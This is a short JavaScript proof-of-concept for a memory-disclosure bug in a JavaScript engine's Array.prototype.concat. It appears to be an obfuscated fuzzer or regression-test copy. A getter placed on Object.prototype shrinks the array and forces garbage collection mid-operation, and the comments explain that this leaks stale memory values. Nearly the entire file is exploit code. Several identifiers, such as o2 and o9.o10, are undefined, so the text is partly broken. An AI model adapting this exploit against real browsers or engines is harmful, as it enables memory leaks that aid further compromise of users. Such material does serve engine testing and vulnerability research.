var o0 = o4.o5[o16];
var o1 = Object.prototype.defineProperty;



var o3 = new o2(100);
o3[1] = 0.1;
o3[2] = 0.1;

function o4() {
    for (var o5 = 0; o5 < 0x100000; ++o5) {
        var o6 = new String();
    }
}

function o7() {
    o3.length = 1; // shorten the array so the backstore pointer is relocated
    o4();         // force gc to move the array's elements backstore
    return o1;
}

Object.prototype.__defineGetter__("defineProperty", o7);

var o8 = Array.prototype.concat.call(o3);

for (var o5 = 0; o5 < 20; o5++) { // however many values you want to leak
    o9.o10(o8[o5]);
}